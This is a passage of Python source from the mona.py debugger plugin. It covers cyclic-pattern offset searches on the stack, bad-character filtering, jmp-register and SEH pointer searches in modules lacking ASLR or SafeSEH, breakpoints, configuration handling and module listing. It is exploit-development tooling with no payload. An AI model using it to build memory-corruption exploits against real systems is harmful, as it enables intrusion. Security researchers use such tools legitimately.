											(PTR_PRINT % stackcounter), pattype, STACK_POINTER, sign, rmLeading(toHex(offsetvalue), "0"),
											sign, offsetvalue, offset, thissize,
											(PTR_PRINT % (stackcounter + thissize - 1)), STACK_POINTER, espsign, rmLeading(toHex(espoff), "0"))

									if currptr not in stackcontains:
										stackcontains[currptr] = [offsetvalue, sign, offset, thissize, pattype]
								else:
									# if we are close to SP, change stepsize to 1
									if offsetvalue <= 256:
										stepsize = 1

			stackcounter += stepsize

		# stack has pointer into cyclic pattern ?
		interruptMona()
		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- " + str(distance) + " bytes)"
			dbg.log("")
			dbg.log("[+] Examining stack %s - looking for pointers to cyclic pattern" % extratxt)
		tofile += "\n[+] Examining stack %s - looking for pointers to cyclic pattern\n" % extratxt

		# get stack this address belongs to
		stacks = getStacks()
		thisstackbase = 0
		thisstacktop = 0

		if distance < 1:
			for tstack in stacks:
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + PTR_SIZE

		stackcounter = thisstackbase
		sign = ""

		interruptMona()
		if not silent:
			dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter), toHex(thisstacktop - PTR_SIZE), toHex(thisstacktop - PTR_SIZE - stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter), toHex(thisstacktop - PTR_SIZE), toHex(thisstacktop - PTR_SIZE - stackcounter))

		while stackcounter < thisstacktop - PTR_SIZE:
			espoffset = stackcounter - curresp
			dbg.updateLog()

			if espoffset > -1:
				sign = "+"
			else:
				sign = "-"

			cont = dbg.readMemory(stackcounter, PTR_SIZE)

			if len(cont) == PTR_SIZE:
				try:
					currptr = struct.unpack(PTR_FMT, cont)[0]
					contat = dbg.readMemory(currptr, 4)
				except:
					contat = b""

				if contat != b"":
					for pattype in pattypes:
						dbg.updateLog()
						regpattern = fullpattern_bytes
						hexpat = contat

						if pattype == "upper":
							regpattern = fullpattern_bytes.upper()
						if pattype == "lower":
							regpattern = fullpattern_bytes.lower()
						if pattype == "unicode":
							regpattern = ensure_bytes(toUnicode(fullpattern))
							hexpat1 = dbg.readMemory(currptr, 4)
							hexpat2 = dbg.readMemory(currptr + 4, 4)
							hexpat1 = hexpat1.replace(b"\x00", b"")
							hexpat2 = hexpat2.replace(b"\x00", b"")
							if hexpat1 == b"" or hexpat2 == b"":
								# no unicode
								hexpat = b""
								break
							else:
								hexpat = hexpat1 + hexpat2

						if len(hexpat) == 4:
							offset = regpattern.find(hexpat)

							if offset > -1:
								if pattype == "unicode":
									offset = offset // 2

								thissize = getPatternLength(currptr, pattype, args)
								if thissize > 0:
									offsetvalue = abs(espoffset)
									if not silent:
										dbg.log("    0x%s : Pointer into %s cyclic pattern at %s%s0x%s (%s%s) : 0x%s : offset %d, length %d" % (
											toHex(stackcounter), pattype, STACK_POINTER, sign, rmLeading(toHex(offsetvalue), "0"),
											sign, offsetvalue, toHex(currptr), offset, thissize))
									tofile += "    0x%s : Pointer into %s cyclic pattern at %s%s0x%s (%s%s) : 0x%s : offset %d, length %d\n" % (
										toHex(stackcounter), pattype, STACK_POINTER, sign, rmLeading(toHex(offsetvalue), "0"),
										sign, offsetvalue, toHex(currptr), offset, thissize)

									if currptr not in stack:
										stack[currptr] = [offsetvalue, sign, offset, thissize, pattype]

			stackcounter += PTR_SIZE
	else:
		dbg.log("** Are you connected to an application ?", highlight=1)

	if "stack" not in results:
		results["stack"] = stack
	if "stackcontains" not in results:
		results["stackcontains"] = stackcontains

	if tofile != "":
		objfindmspfile = MnLog("findmsp.txt")
		findmspfile = objfindmspfile.reset(skipModuleTable=True)
		objfindmspfile.write(tofile, findmspfile)

	return results

	
#-----------------------------------------------------------------------#
# convert arguments to criteria
#-----------------------------------------------------------------------#

def args2criteria(args,modulecriteria,criteria):

	dbg.log("[+] Processing arguments and criteria")
	global ptr_to_get
	
	# meets access level ?
	criteria["accesslevel"] = "X"
	if "x" in args : 
		if not args["x"].upper() in ["*","R","RW","RX","RWX","W","WX","X"]:
			dbg.log("invalid access level : %s" % args["x"], highlight=1)
			criteria["accesslevel"] = ""
		else:
			criteria["accesslevel"] = args["x"].upper()
		
	dbg.log("    - Pointer access level : %s" % criteria["accesslevel"])
	
	# query OS modules ?
	if "o" in args and args["o"]:
		modulecriteria["os"] = False
		dbg.log("    - Ignoring OS modules")

	# filter modules by path ?
	if "cmp" in args and args["cmp"]:
		pattern = str(args["cmp"])
		# convert glob wildcards (* and ?) to regex equivalents so that
		# patterns like *system32* work as expected; raw regex still works
		pattern = pattern.replace("*", ".*").replace("?", ".")
		try:
			re.compile(pattern)
		except re.error as e:
			dbg.log("[!] Invalid regex for -cmp: %s" % e)
			return modulecriteria, criteria
		modulecriteria["cmp"] = pattern
		dbg.log("    - Filtering modules by path matching : %s" % pattern)
	
	# allow nulls ?
	if "n" in args and args["n"]:
		criteria["nonull"] = True
		dbg.log("    - Ignoring pointers that have null bytes")
	
	# override list of modules to query ?
	if "m" in args:
		if type(args["m"]).__name__.lower() != "bool":
			modulecriteria["modules"] = args["m"]
			dbg.log("    - Only querying modules %s" % args["m"])
				
	# limit nr of pointers to search ?
	if "p" in args:
		if str(args["p"]).lower() != "true":
			ptr_to_get = int(args["p"].strip())
		if ptr_to_get > 0:	
			dbg.log("    - Maximum nr of pointers to return : %d" % ptr_to_get)
	
	# only want to see specific type of pointers ?
	if "cp" in args:
		ptrcriteria = args["cp"].split(",")
		for ptrcrit in ptrcriteria:
			ptrcrit=ptrcrit.strip("'")
			ptrcrit=ptrcrit.strip('"').lower().strip()
			criteria[ptrcrit] = True
		dbg.log("    - Pointer criteria : %s" % ptrcriteria)
	
	if "cbp" in args:
		dbg.log("    * Trying to use '-cbp' instead of '-cpb'?", highlight=True)
		if not "cpb" in args:
			dbg.log("    * I'll try to fix your typo myself, but please pay attention to the syntax next time", highlight=True)
			args["cpb"] = args["cbp"]
	
	if "cpb" in args:
		badchars = args["cpb"]
		badchars = badchars.replace("'","")
		badchars = badchars.replace('"',"")
		badchars = badchars.replace("\\x","")
		# see if we need to expand ..
		bpos = 0
		newbadchars = ""
		while bpos < len(badchars):
			curchar = badchars[bpos]+badchars[bpos+1]
			if curchar == "..":
				pos = bpos
				if pos > 1 and pos <= len(badchars)-4:
					# get byte before and after ..
					bytebefore = badchars[pos-2] + badchars[pos-1]
					byteafter = badchars[pos+2] + badchars[pos+3]
					bbefore = int(bytebefore,16)
					bafter = int(byteafter,16)
					insertbytes = ""
					bbefore += 1
					while bbefore < bafter:
						insertbytes += "%02x" % bbefore
						bbefore += 1
					newbadchars += insertbytes
			else:
				newbadchars += curchar
			bpos += 2
		badchars = newbadchars
		cnt = 0
		strb = b""
		while cnt < len(badchars):
			strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
			cnt=cnt+2
		criteria["badchars"] = strb
		dbg.log("    - Bad char filter will be applied to pointers : %s " % args["cpb"])
			
	if "cm" in args:
		modcriteria = args["cm"].split(",")
		for modcrit in modcriteria:
			modcrit=modcrit.strip("'")
			modcrit=modcrit.strip('"').lower().strip()
			#each criterium has 1 or 2 parts : criteria=value
			modcritparts = modcrit.split("=")
			try:
				if len(modcritparts) < 2:
					# set to True, no value given
					modulecriteria[modcritparts[0].strip()] = True
				else:
					# read the value
					modulecriteria[modcritparts[0].strip()] = (modcritparts[1].strip() == "true")
			except:
				continue
		if (inspect.stack()[1][3] == "procShowMODULES"):
			modcriteria = args["cm"].split(",")
			for modcrit in modcriteria:
				modcrit=modcrit.strip("'")
				modcrit=modcrit.strip('"').lower().strip()
				if modcrit.startswith("+"):
					modulecriteria[modcrit]=True
				else:
					modulecriteria[modcrit]=False
		dbg.log("    - Module criteria : %s" % modcriteria)

	return modulecriteria,criteria			
				
	
#manage breakpoint on selected exported/imported functions from selected modules
def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",query_type="export",extracmd=""):	
	"""
	Sets a breakpoint on selected exported/imported functions from selected modules
	
	Arguments : 
	modulecriteria - Dictionary
	funcfilter - comma separated string indicating functions to set bp on
			must contains "*" to select all functions
	mode - "add" to create bp's, "del" to remove bp's
	
	Returns : nothing
	"""
	
	dbgp(get_current_function_name())
	
	query_type = query_type.lower()
	if query_type == "export" or query_type == "eat":
		query_type = "export"
	else:
		query_type = "import"

	namecrit = funcfilter.strip('"').strip("'").split(",")
	
	if mode == "add" or mode == "del" or mode == "list":
		if not silent:
			dbg.log("[+] Enumerating %sed functions" % query_type)
		modulestosearch = getModulesToQuery(modulecriteria)
		
		bpfuncs = {}
		
		for thismodule in modulestosearch:
			deltastart = len(bpfuncs)
			tmod = MnModule(thismodule)
			shortname = tmod.getShortName()
			fullname = tmod.moduleFilename
			if not silent:
				dbg.log("")
				dbg.log("    Querying module '%s' (%s)" % (fullname,shortname))
			#syms = themod.getSymbols()
			# get funcs
			funcs = {}
			if query_type == "export":
				if not silent:
					dbg.log("      Step 1: enumerating EAT")	
				funcs = tmod.getEAT()			
			else:
				if not silent:
					dbg.log("      Step 1: enumerating IAT")
				funcs = tmod.getIAT()
			if not silent:
				dbg.log("        Total nr of %sed functions in %s: %d" % (query_type, thismodule, len(funcs)))
			for func in funcs:
				if meetsCriteria(MnPointer(func), criteria):
					funcname = funcs[func].lower()
					setbp = False
					if "*" in namecrit:
						setbp = True
					else:
						for crit in namecrit:
							crit = crit.lower()
							tcrit = crit.replace("*","")
							if (crit.startswith("*") and crit.endswith("*")) or (crit.find("*") == -1):
								if funcname.find(tcrit) > -1:
									setbp = True
							elif crit.startswith("*"):
								if funcname.endswith(tcrit):
									setbp = True
							elif crit.endswith("*"):
								if funcname.startswith(tcrit):
									setbp = True
					
					if setbp:
						if query_type == "export":
							if not func in bpfuncs:
								bpfuncs[func] = funcs[func]
						else:
							ptr = 0
							try:
								#read pointer of imported function
								ptr=struct.unpack(PTR_FMT,dbg.readMemory(func,PTR_SIZE))[0]
							except Exception as e:
								dbgp("Unable to read IAT entry at %s" % (PTR_PRINT % func), errormode=False)
								pass
							if ptr > 0:
								if not ptr in bpfuncs:
									bpfuncs[ptr] = funcs[func]

			if __DEBUGGERAPP__ == "WinDBG":
				# let's do a few searches
				for crit in namecrit:
					if crit.find("*") == -1:
						crit = "*" + crit + "*"
					if not silent:
						dbg.log("      Step 2: Performing WinDBG Symbol lookup. (This may cause symbols to be downloaded first)")
					# try with fullname first
					# if no results, do shortname (but may cause results from IAT, which we don't need)
					runcnt = 0
					nrfound = 0
					#runfields = [fullname, shortname]
					runfields = [fullname]
					while (runcnt < len(runfields)) and (nrfound == 0):
						interruptMona()
						if (runcnt > 0):
							dbg.log("        No results yet, expanding symbol search")
						dbg.log("        Launching symbol query, run %d" % (runcnt+1))
						if DEBUG_MODE:
							dbg.nativeCommand("!sym noisy")
						modsearch = "x %s!%s" % (runfields[runcnt],crit)
						output = dbg.nativeCommand(modsearch)
						if not silent:
							dbg.log("        Symbol lookup, run %d done. Processing results" % (runcnt+1))
						if DEBUG_MODE:
							dbg.nativeCommand("!sym quiet")
						dbgp("output: %s" % output)
						outputlines = output.split("\n")
						for line in outputlines:
							if line.replace(" ","") != "":
								linefields = line.split(" ")
								if len(linefields) > 1:
									ptr = hexStrToInt(linefields[0].replace("`",""))
									cnt = 1
									while cnt < len(linefields)-1:
										if linefields[cnt] != "":
											funcname = linefields[cnt]
											break
										cnt += 1
									if "!" in funcname:
										funcnamesplit = funcname.split("!")
										if len(funcnamesplit) > 1:
											funcname = funcnamesplit[1]
									if not ptr in bpfuncs:
										bpfuncs[ptr] = funcname
										nrfound += 1
						dbg.log("        Symbol search yielded %d functions" % nrfound)
						runcnt += 1
						

			if not silent:
				deltacurrent = len(bpfuncs) - deltastart
				if deltacurrent > 0:
					dbg.log("        Identified %d functions in module '%s'" % (deltacurrent, fullname))
				dbg.log("        Number of functions to break on so far: %d " % len(bpfuncs))
		if not silent:
			dbg.log("")
			dbg.log("[+] Total nr of breakpoints to process : %d" % len(bpfuncs))
		bp_table = {}
		headers = ["Address", "Action", "Bp on Function", "module"]
		types   = ["pointer", "string", "string", "string"]
		dbg.log("")
		
		if len(bpfuncs) > 0:
			for funcptr in bpfuncs:
				if mode == "add":
					try:
						dbg.setBreakpoint(funcptr, extracmd=extracmd)
						bp_table[funcptr] = ["add: OK", bpfuncs[funcptr], MnPointer(funcptr).belongsTo()]
					except Exception as e:
						#dbg.log("Failed setting bp at 0x%s" % toHex(funcptr))
						bp_table[funcptr] = ["add: X", bpfuncs[funcptr],"%s" % str(e)]
				elif mode == "del":
					#dbg.log("Remove bp at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					try:
						dbg.deleteBreakpoint(funcptr)
						bp_table[funcptr] = ["del: OK", bpfuncs[funcptr], MnPointer(funcptr).belongsTo()]
					except Exception as e:
						#dbg.log("Skipped removal of bp at 0x%s" % toHex(funcptr))
						bp_table[funcptr] = ["del: X", bpfuncs[funcptr], MnPointer(funcptr).belongsTo()]
				elif mode == "list":
					#dbg.log("Match found at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					bp_table[funcptr] = ["list", bpfuncs[funcptr], MnPointer(funcptr).belongsTo()]
					
			print_dict_table(bp_table, headers, types, padding = "    ",itemsequence = [])

	return


def getAbsolutePath(filename):
	# attempt to read input file from workingfolder (if any)
	# unless absolute path has been specified
	if os.path.isabs(filename) or filename == "":
		return filename
	else:
		debuggedname = dbg.getDebuggedName()
		thispid = dbg.getDebuggedPid()
		if thispid == 0:
			debuggedname = "_no_name_"
		thisconfig = MnConfig()
		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
		#strip extension from debuggedname
		parts = debuggedname.split(".")
		extlen = len(parts[len(parts)-1])+1
		debuggedname = debuggedname[0:len(debuggedname)-extlen]
		debuggedname = debuggedname.replace(" ","_")
		workingfolder = workingfolder.replace('%p', debuggedname)
		workingfolder = workingfolder.replace('%i', str(thispid))		

		# create workingfolder (if it does not exist yet)
		#does working folder exist ?
		if workingfolder != "":
			if not os.path.exists(workingfolder):
				try:
					dbg.log("    - Creating working folder %s" % workingfolder)
					#recursively create folders
					os.makedirs(workingfolder)
					dbg.log("    - Folder created")
				except:
					dbg.log("   ** Unable to create working folder %s, the debugger program folder will be used instead" % workingfolder,highlight=1)

		return os.path.join(workingfolder, filename)

#-----------------------------------------------------------------------#
# 1st level functions that get called when running a mona command
#-----------------------------------------------------------------------#	

# ----- Config file management ----- #

def procConfig(args):
	#did we specify -get, -set, -add, -list or -del?
	showerror = False
	showlist = False
	if not "set" in args and not "get" in args and not "add" in args and not "del" in args and not "list" in args:
		showlist = True
		
	if "set" in args:
		if type(args["set"]).__name__.lower() == "bool":
			showerror = True
		else:
			#count nr of words
			params = args["set"].split(" ")
			if len(params) < 2:
				showerror = True

	if "add" in args:
		if type(args["add"]).__name__.lower() == "bool":
			showerror = True
		else:
			#count nr of words
			params = args["add"].split(" ")
			if len(params) < 2:
				showerror = True

	if "get" in args:
		if type(args["get"]).__name__.lower() == "bool":
			showerror = True
		else:
			#count nr of words
			params = args["get"].split(" ")
			if len(params) < 1:
				showerror = True
	
	if "del" in args:
		if type(args["del"]).__name__.lower() == "bool":
			showerror = True
		else:
			#count nr of words
			params = args["del"].split(" ")
			if len(params) < 1:
				showerror = True
	
	if "clear" in args:
		if type(args["clear"]).__name__.lower() == "bool":
			showerror = True
		else:
			#count nr of words
			params = args["clear"].split(" ")
			if len(params) < 1:
				showerror = True	


	if showerror:
		dbg.log("Invalid arguments - check the help for this command")
		#dbg.logLines(configUsage,highlight=1)
		return
	else:
		monaConfig = MnConfig()
		configfilename = monaConfig.getFileName()

		if "list" in args or showlist:
			dbg.log("[+] Listing all parameters and values stored in configuration file")
			dbg.log("    Config file: %s" % configfilename)
			dbg.log("")
			monaConfig.list()

		if "get" in args:
			dbg.log("[+] Reading value from configuration file")
			dbg.log("    Config file: %s" % configfilename)
			dbg.log("")
			paramname = args["get"].split(" ")[0]
			thevalue = monaConfig.get(paramname)
			configDict = {}
			headers = ["Parameter", "Value"]
			types   = ["string", "string"]
			configDict[paramname] = [thevalue]
			print_dict_table(configDict, headers, types, padding = "    ", itemsequence = [])
		
		if "set" in args:
			value = args["set"].split(" ")
			configparam = value[0].strip()
			dbg.log("[+] Saving new value for parameter '%s'" % configparam)
			dbg.log("    Config file: %s" % configfilename)
			dbg.log("    Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
			dbg.log("    New value:")
			dbg.log("")
			configvalue = args["set"][0+len(configparam):len(args["set"])]
			if configparam.lower() == "excluded_modules":
				configvalue = configvalue.replace(";", ",")
			monaConfig.set(configparam,configvalue)
			configDict = {}
			headers = ["Parameter", "New value"]
			types   = ["string", "string"]
			configDict[configparam] = [configvalue]
			print_dict_table(configDict, headers, types, padding = "    ", itemsequence = [])
			
		if "clear" in args:
			value = args["clear"].split(" ")
			configparam = value[0].strip()
			dbg.log("[+] Attempting to clear config parameter '%s'" % configparam)
			dbg.log("    Config file: %s" % configfilename)
			dbg.log("    Current value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
			monaConfig.clear(configparam)
			dbg.log("    Parameter %s cleared / removed" % (configparam))
			dbg.log("")
			dbg.log("[+] Listing current values from configuration file:")
			dbg.log("")
			monaConfig.list()

		
		if "add" in args:
			value = args["add"].split(" ")
			configparam = value[0].strip()
			dbg.log("[+] Adding additional value(s) to parameter '%s'" % configparam)
			dbg.log("    Config file: %s" % configfilename)
			dbg.log("    Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
			oldvalue = monaConfig.get(configparam)
			if oldvalue is None:
				oldvalue = ""
			oldvalue = oldvalue.strip()
			newvalue_str = args["add"][0+len(configparam):len(args["add"])].strip()
			
			# Split old values and new values by comma
			old_values = [v.strip() for v in oldvalue.split(",") if v.strip()]
			new_values = [v.strip() for v in newvalue_str.split(",") if v.strip()]
			
			added_values = []
			skipped_values = []
			
			for new_val in new_values:
				if new_val in old_values:
					skipped_values.append(new_val)
					dbg.log("    Skipping '%s' - already present in parameter '%s'" % (new_val, configparam))
				else:
					added_values.append(new_val)
					old_values.append(new_val)
			
			if added_values:
				configvalue = ",".join(old_values)
				monaConfig.set(configparam, configvalue)
				dbg.log("    Added value(s): %s" % ", ".join(added_values))
			else:
				configvalue = oldvalue
				dbg.log("    No new values added")
			
			dbg.log("    New value:")
			dbg.log("")
			configDict = {}
			headers = ["Parameter", "New value"]
			types   = ["string", "string"]
			configDict[configparam] = [configvalue]
			print_dict_table(configDict, headers, types, padding = "    ", itemsequence = [])			



		if "del" in args:
			value = args["del"].split(" ")
			configparam = value[0].strip()
			delvalue_str = args["del"][0+len(configparam):len(args["del"])].strip()

			# get the current values
			currentvalues = monaConfig.get(configparam)
			if currentvalues is None:
				currentvalues = ""
			valueslist = [v.strip() for v in currentvalues.split(",") if v.strip()]
			
			# Split the values to delete by comma
			del_values = [v.strip() for v in delvalue_str.split(",") if v.strip()]
			
			newlist = valueslist[:]
			removed_values = []
			not_found_values = []
			
			for del_val in del_values:
				if del_val in newlist:
					newlist.remove(del_val)
					removed_values.append(del_val)
				else:
					not_found_values.append(del_val)
			
			configvalue = ",".join(newlist)

			dbg.log("[+] Attempting to remove value(s) '%s' from parameter '%s'" % (delvalue_str, configparam))
			dbg.log("    Config file: %s" % configfilename)

			dbg.log("    Current value of parameter %s = %s" % (configparam, monaConfig.get(configparam)))
			monaConfig.set(configparam, configvalue)
			
			if removed_values:
				dbg.log("    Removed value(s): %s" % ", ".join(removed_values))
			if not_found_values:
				dbg.log("    Value(s) not found: %s" % ", ".join(not_found_values))
			
			dbg.log("")
			configDict = {}
			headers = ["Parameter", "New value"]
			types   = ["string", "string"]
			configDict[configparam] = [configvalue]
			print_dict_table(configDict, headers, types, padding = "    ", itemsequence = [])



		
# ----- Jump to register ----- #

def procFindJ(args, procUsage=""):
	return procFindJMP(args, procUsage)


def procFindJMP(args, procUsage=""):
	dbgp(get_current_function_name())
	dbgp("    args: %s" % args)
	#default criteria
	modulecriteria={}
	modulecriteria["aslr"] = False
	modulecriteria["rebase"] = False
	
	if (inspect.stack()[1][3] == "procFindJ"):
		dbg.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...",highlight=1)

	criteria={}
	all_opcodes={}
	
	global ptr_to_get
	ptr_to_get = -1
	
	distancestr = ""
	mindistance = 0
	maxdistance = 0
	
	#did user specify -r <reg> ?
	showerror = False
	if "r" in args:
		if type(args["r"]).__name__.lower() == "bool":
			showerror = True
		else:
			#valid register ?
			thisreg = args["r"].lower().strip()
			if arch == 32:
				validregs = dbglib.Registers32BitsOrder[:]
			if arch == 64:
				validregs = dbglib.Registers32BitsOrder[:] + dbglib.Registers64BitsOrder[:]
			if not thisreg in validregs:
				dbg.log("Invalid register '%s'." % args["r"].strip(), highlight=1)
				dbg.log("Valid registers: %s" % ", ".join(validregs))
				return
	else:
		showerror = True
	

	if "distance" in args:
		if type(args["distance"]).__name__.lower() == "bool":
			showerror = True
		else:
			distancestr = args["distance"]
			distanceparts = distancestr.split(",")
			for parts in distanceparts:
				valueparts = parts.split("=")
				if len(valueparts) > 1:
					if valueparts[0].lower() == "min":
						try:
							mindistance = int(valueparts[1])
						except:
							mindistance = 0		
					if valueparts[0].lower() == "max":
						try:
							maxdistance = int(valueparts[1])
						except:
							maxdistance = 0						
	
	if maxdistance < mindistance:
		tmp = maxdistance
		maxdistance = mindistance
		mindistance = tmp
	
	criteria["mindistance"] = mindistance
	criteria["maxdistance"] = maxdistance
	
	if showerror:
		dbg.log("Usage :")
		dbg.logLines(procUsage,highlight=1)
		return				
	else:
		modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
		dbgp("    modulecriteria: %s" % modulecriteria)
		dbgp("    searchcriteria: %s" % criteria)
		# go for it !	
		all_opcodes=findJMP(modulecriteria,criteria,args["r"].lower().strip())
	
	# write to log
	logfile = MnLog("jmp.txt")
	thislog = logfile.reset()
	processResults(all_opcodes,logfile,thislog, forcelower=True)

# ----- Exception Handler Overwrites ----- #

			
def procFindSEH(args, procUsage=""):
	#default criteria
	modulecriteria={}
	modulecriteria["safeseh"] = False
	modulecriteria["aslr"] = False
	modulecriteria["rebase"] = False

	criteria = {}
	specialcases = {}
	all_opcodes = {}
	
	global ptr_to_get
	ptr_to_get = -1
	
	#what is the caller function (backwards compatibility with pvefindaddr)
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

	if "rop" in args:
		criteria["rop"] = True
	
	if "all" in args:
		criteria["all"] = True
		specialcases["maponly"] = True
	else:
		criteria["all"] = False
		specialcases["maponly"] = False
	
	# go for it !	
	all_opcodes = findSEH(modulecriteria,criteria)
	#report findings to log
	logfile = MnLog("seh.txt")
	thislog = logfile.reset()
	processResults(all_opcodes,logfile,thislog,specialcases,forcelower=True)
	



# ----- MODULES ------ #
PEB_ORDER_VALID = ("load", "memory", "init")
# Single source of truth for every sortable module column.
# type "hex"  -> numeric, default ascending (low values first)
# type "bool" -> boolean, default ascending (False-first = unprotected modules first)
MODULE_COLUMNS = {
	"base":    {"key": lambda x: x[1]["base"],    "type": "hex",  "default_reverse": False},
	"size":    {"key": lambda x: x[1]["size"],    "type": "hex",  "default_reverse": False},
	"rebase":  {"key": lambda x: x[1]["rebase"],  "type": "bool", "default_reverse": False},
	"safeseh": {"key": lambda x: x[1]["safeseh"], "type": "bool", "default_reverse": False},
	"aslr":    {"key": lambda x: x[1]["aslr"],    "type": "bool", "default_reverse": False},
	"cfg":     {"key": lambda x: x[1]["cfg"],     "type": "bool", "default_reverse": False},
	"nx":      {"key": lambda x: x[1]["nx"],      "type": "bool", "default_reverse": False},
	"os":      {"key": lambda x: x[1]["os"],      "type": "bool", "default_reverse": False},
}

def _parse_sort_spec(spec):
	"""
	Parse a compound sort specifier into a list of (key, reverse) tuples.

	For hex/numeric columns: '+' = ascending (low first),  '-' = descending (high first).
	For bool columns:        '+' = has the flag (True first), '-' = does not have the flag (False first).
	No suffix uses the per-column default_reverse from MODULE_COLUMNS
	  (bool columns default to False first / does not have the flag; hex columns default to low first).

	Supported separator styles:
	  - Commas:       -sort base,aslr
	  - Spaces:       -sort base aslr   (WinDbg passes quoted strings as a single token,
	                                     so spaces always work as delimiters)
	  - Concatenated: -sort base+aslr-   (the +/- suffix acts as delimiter)

	Returns (sort_keys, error_string). error_string is None on success.
	"""
	spec = spec.strip()
	# WinDbg strips quotes before passing args to Python, so any internal spaces
	# are legitimate delimiters.  Always split on whitespace or commas.
	parts = re.split(r'[\s,]+', spec.lower().strip())
	tokens = []
	for part in parts:
		if not part:
			continue
		found = re.findall(r'([a-z]+)([+-]?)', part)
		# Verify the whole part was consumed (no leftover non-alpha chars besides +/-)
		reconstructed = "".join(k + d for k, d in found)
		if reconstructed != part:
			return None, "cannot parse sort token '%s'" % part
		tokens.extend(found)
	if not tokens:
		return None, "empty sort spec"
	sort_keys = []
	for key, direction in tokens:
		if key not in MODULE_COLUMNS:
			return None, "unknown sort key '%s', valid options: %s" % (key, ", ".join(MODULE_COLUMNS))
		is_bool = MODULE_COLUMNS[key]["type"] == "bool"
		if direction == "+":
			# bool: has the flag (True) first; numeric: low first (ascending)
			reverse = True if is_bool else False
		elif direction == "-":
			# bool: does not have the flag (False) first; numeric: high first (descending)
			reverse = False if is_bool else True
		else:
			reverse = MODULE_COLUMNS[key]["default_reverse"]
		sort_keys.append((key, reverse))
	return sort_keys, None


def procShowMODULES(args):
	modulecriteria={}
	criteria={}
	
	modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

	peb_order = "load"
	if "peborder" in args and args["peborder"]:
		peb_val = str(args["peborder"]).lower().strip()
		if peb_val not in PEB_ORDER_VALID:
			dbg.log("[!] Unknown -peborder value '%s', valid options: %s" % (peb_val, ", ".join(PEB_ORDER_VALID)))
			return
		peb_order = peb_val

	sort_keys = []
	if "sort" in args and args["sort"]:
		sort_keys, err = _parse_sort_spec(str(args["sort"]).strip())
		if err:
			dbg.log("[!] Invalid -sort value: %s" % err)
			return

	modulestosearch = getModulesToQuery(modulecriteria, from_memory=True, peb_order=peb_order)
	showModuleTable("", modulestosearch, modulecriteria, sort_keys=sort_keys, peb_order=peb_order)
	logfile = MnLog("modules.txt")
	thislog = logfile.reset(skipModuleTable=True)
	showModuleTable(thislog, modulestosearch, modulecriteria, sort_keys=sort_keys, peb_order=peb_order)


def procModuleInfo(args):
	"""Show detailed information about a single module, looked up by name or base address."""
	populateModuleInfo()

	target_key = None

	if "a" in args and args["a"]:
		
		lookup_base,addyok = getAddyArg(args["a"])
		if not addyok:
			dbg.log("%s is an invalid address" % args["a"], highlight=1)
			return
		dbg.log("[+] Checking if address 0x%x is part of a module" % lookup_base)
		for key, props in mnproc.g_modules.items():
			if props["base"] <= lookup_base < props["base"] + props["size"]:
				target_key = key
				break
		if target_key is None:
			dbg.log("[!] No module found containing address 0x%x" % lookup_base, highlight=1)
			return

	elif "m" in args and args["m"]:
		# Look up by image name — match against filename or key, case-insensitive,
		# with and without extension so 'kernel32' matches 'kernel32.dll'
		needle = os.path.splitext(str(args["m"]).strip().lower())[0]
		for key, props in mnproc.g_modules.items():
			fname = os.path.splitext((props["filename"] or props["name"]).lower())[0]
			if fname == needle or os.path.splitext(props["name"].lower())[0] == needle:
				target_key = key
				break
		if target_key is None:
			dbg.log("[!] No loaded module named '%s'" % args["m"], highlight=1)
			return

	else:
		dbg.log("[!] Provide -m <imagename> or -a <address/register>", highlight=1)
		return

	p = mnproc.g_modules[target_key]
	thismod = MnModule(target_key)
	isCFG = getModuleProperty(target_key, "cfg")
	if isCFG:
		cfgTable = thismod.getCFGTable()
		if len(cfgTable) > 0:
			dbgp("Module %s is CFG Enabled. Table at %s, %d entries" % (target_key, PTR_PRINT % cfgTable.cfg_table_va, cfgTable.cfg_count))

	base     = p["base"]
	top      = p["top"]
	size     = p["size"]
	entry    = p["entry"]
	cbbase   = p["codebase"]
	cbsize   = p["codesize"]
	cbtop    = p["codetop"]
	dllchars = p["dllcharacteristics"]
	fname    = p["filename"] or p["name"]

	# Decode DllCharacteristics flags
	DLLCHAR_FLAGS = [
		(0x0020, "HIGH_ENTROPY_VA"),
		(0x0040, "DYNAMIC_BASE (ASLR)"),
		(0x0080, "FORCE_INTEGRITY"),
		(0x0100, "NX_COMPAT"),
		(0x0200, "NO_ISOLATION"),
		(0x0400, "NO_SEH"),
		(0x0800, "NO_BIND"),
		(0x1000, "APPCONTAINER"),
		(0x2000, "WDM_DRIVER"),
		(0x4000, "GUARD_CF (CFG)"),
		(0x8000, "TERMINAL_SERVER_AWARE"),
	]
	set_flags = [name for bit, name in DLLCHAR_FLAGS if dllchars & bit]

	# Read section headers from the PE in memory
	sections = []
	SCN_CHARS = [
		(0x00000020, "CODE"),
		(0x00000040, "IDATA"),
		(0x00000080, "UDATA"),
		(0x20000000, "EXEC"),
		(0x40000000, "READ"),
		(0x80000000, "WRITE"),
	]
	try:
		pe_off     = struct.unpack('<L', dbg.readMemory(base + 0x3c, 4))[0]
		pe_base    = base + pe_off
		num_secs   = struct.unpack('<H', dbg.readMemory(pe_base + 0x06, 2))[0]
		opt_sz     = struct.unpack('<H', dbg.readMemory(pe_base + 0x14, 2))[0]
		secs_start = pe_base + 0x18 + opt_sz
		for i in range(num_secs):
			sec   = secs_start + i * 40
